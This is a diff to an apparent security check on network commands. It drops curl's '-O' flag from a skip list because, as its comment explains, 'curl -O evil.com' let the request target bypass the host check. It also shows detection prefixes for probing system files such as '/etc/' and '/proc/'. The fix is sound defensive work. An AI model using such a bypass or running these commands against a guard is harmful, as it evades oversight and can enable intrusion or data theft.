@@ -47,7 +47,6 @@ _ENUM_PREFIXES = ("find /", "ls /home", "ls /etc", "cat /etc/", "cat /proc/")
 _VALUE_TAKING_FLAGS = {
     "-o",
     "--output",
-    "-O",
     "--output-document",
     "-d",
     "--data",
@@ -101,6 +100,13 @@ _VALUE_TAKING_FLAGS = {
 #   --resolve HOST:PORT:ADDR / --connect-to H1:P1:H2:P2 pin or redirect the
 #                       connection to an arbitrary host/IP; the leading host
 #                       component stays checked.
+#   -O                  curl's `-O`/`--remote-name` takes NO argument (only
+#                       wget's `-O` does); listing it made `curl -O evil.com`
+#                       skip the request target and bypass the check. Excluded
+#                       so the target stays checked. `wget -O <file>` therefore
+#                       re-checks its filename as a host — over-block, safe.
+#                       (`--output-document`, wget's unambiguous long form,
+#                       stays in the skip set.)
 # Per this module's own principle (skip only flags whose value is never a host),
 # leaving these out at worst over-blocks — the safe direction.
 # (Devin + security review on #847.)
